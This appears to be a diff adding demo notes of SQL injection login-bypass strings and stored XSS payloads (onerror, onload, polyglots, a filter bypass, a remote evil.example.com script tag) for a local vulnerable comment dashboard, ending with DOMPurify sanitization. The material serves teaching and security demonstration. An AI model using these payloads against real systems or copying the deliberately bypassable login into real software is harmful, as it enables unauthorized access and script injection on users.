@@ -1,0 +1,179 @@
+' OR 1=1; --
+sql injection
+admin' --
+
+///////////////////////
+<script>
+  document.body.style.background='magenta';
+  document.documentElement.style.background='magenta';
+  Array.from(document.querySelectorAll('*')).forEach(el=>{
+    try { el.style.background='magenta'; el.style.color='#fff'; } catch(e){}
+  });
+</script>
+//////////////////
+
+Usage: put admin' -- in the Username field and any text in Password (or leave blank).
+
+Why it works: -- starts a SQL line comment in SQLite, so the AND password = '...' is commented out. Example resulting SQL:
+
+SELECT id, username FROM users WHERE username = 'admin' -- ' LIMIT 1;
+
+
+Everything after -- is ignored, so only username is checked.
+
+' OR '1'='1' --
+
+Usage: put ' OR '1'='1' -- in Username, Password blank.
+
+Why it works: expands to WHERE username = '' OR '1'='1' -- ' AND password = '...' — the '1'='1' is true and the rest is commented. This returns the first row (LIMIT 1).
+
+anything' OR '1'='1
+
+Usage: Username = anything' OR '1'='1 and Password blank. (No -- required here; because OR '1'='1' makes WHERE true.)
+
+Why it works: WHERE username = 'anything' OR '1'='1' AND password = '...' — note operator precedence might matter, but many DBs evaluate this to true for the OR; the patched route also detects OR and will use the simpler query path.
+
+' OR 1=1 -- (without the outer double quotes)
+
+Usage: Username = ' OR 1=1 --
+
+Why it works: short and classic; 1=1 is always true; -- comments out the rest.
+
+Use Password as the injection vector instead (if you prefer): put a valid username in Username (e.g. admin) and put anything' OR '1'='1' -- in Password. The patched backend will let password comment or OR bypass the check in demo mode.
+XSS
+🧩 1. Basic harmless HTML
+
+Used to show that normal HTML is rendered as-is.
+
+<b>Bold text</b> and <i>italic text</i>
+
+<h2 style="color:orange;">Hello from attacker 😈</h2>
+
+<a href="https://google.com">Click me</a>
+
+⚠️ 2. Stored XSS via event attributes (auto-execute)
+
+These are the classic ones hackers use to trigger scripts automatically.
+
+💥 Image onerror
+<img src=x onerror="alert('XSS - image onerror triggered')">
+
+💥 Broken image variant (works even if filtered)
+<img src="invalidimage" onerror="alert('Broken image executed')">
+
+💥 SVG onload
+💥 Background image + JS (old style)
+<div style="background-image:url(x)" onerror="alert('div onerror')"></div>
+
+🧠 3. Click-based payloads
+
+These show how malicious users can make a link or button that runs JS only when clicked.
+
+<a href="#" onclick="alert('XSS via onclick link')">Click me!</a>
+
+<button onclick="alert('XSS via onclick button')">Press me</button>
+
+<span style="color:red;cursor:pointer" onclick="alert('Evil span clicked')">
+⚠️ Click here
+</span>
+
+🧮 4. Script tag based
+
+Direct <script> tags may or may not execute (browsers often block inline scripts inserted via innerHTML), but they’re great to demonstrate intent.
+
+<script>alert('Script tag executed')</script>
+
+<script>document.body.style.background='pink'</script>
+
+<script src="https://evil.example.com/malicious.js"></script>
+
+
+(won’t load unless you host that file yourself, but it’s good to display the concept)
+
+🧫 5. Attribute / CSS trick injections
+
+These look harmless but manipulate layout or trick users.
+
+///////<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
+You are hacked 😜
+</div>
+
+<input autofocus onfocus="alert('Auto-focus attack')">
+
+🕳️ 6. Polyglot payloads
+
+Designed to execute across multiple contexts (HTML/JS). Use these for “advanced” demo slides.
+
+"><img src=x onerror=alert('polyglot')>
+
+"><svg/onload=alert('svg polyglot')>
+
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+📊 7. Safe but visual payloads
+
+To demonstrate “impact without harm” (color changes, DOM changes, etc.)
+
+<img src=x onerror="document.body.style.background='black';document.body.style.color='white';alert('Page styled by attacker')">
+
+📜 8. Large / spammy payloads
+
+Shows how attackers might flood storage or break UI.
+
+<div style="white-space:pre-wrap;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div>
+
+<script>
+for(let i=0;i<5;i++) alert('Spam '+i);
+</script>
+
+🧩 9. Encoded / obfuscated
+
+Used to show filters can be bypassed.
+
+<img src=x oNerrOr=alert('mixed case bypass')>
+
+🧠 10. HTML injection only (no JS)
+
+For showing that even non-script tags can distort layout / UI.
+
+<table border=1><tr><td>Injected table</td></tr></table>
+
+<h1 style="color:lime;">Big injected header</h1>
+
+💾 11. Database stress / test
+
+To simulate attackers sending long posts.
+
+<script>console.log('start')</script>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+🧱 12. Cross-test combos
+
+Mix safe + malicious for realistic look.
+
+<b>Alice:</b> Great post! <img src=x onerror="alert('from Alice')">
+
+<i>Bob says:</i> <svg onload="alert('XSS by Bob')"></svg>
+
+✅ Bonus: Reset route
+
+When your database gets filled up with junk while testing, use this endpoint:
+
+curl -X DELETE http://localhost:3000/api/comment
+
+
+Or make a small “🗑 Clear All” button that calls:
+
+await fetch('/api/comment', { method: 'DELETE' });
+
+🧭 Suggested testing order (for your dashboard demo)
+
+Start with HTML injection → shows harmless formatting.
+
+Then image onerror / svg onload → stored XSS triggers instantly.
+
+Then onclick link → show user-interaction attack.
+
+Then script tag → explain browser protections.
+
+Finally show DOMPurify sanitized version → safe display.
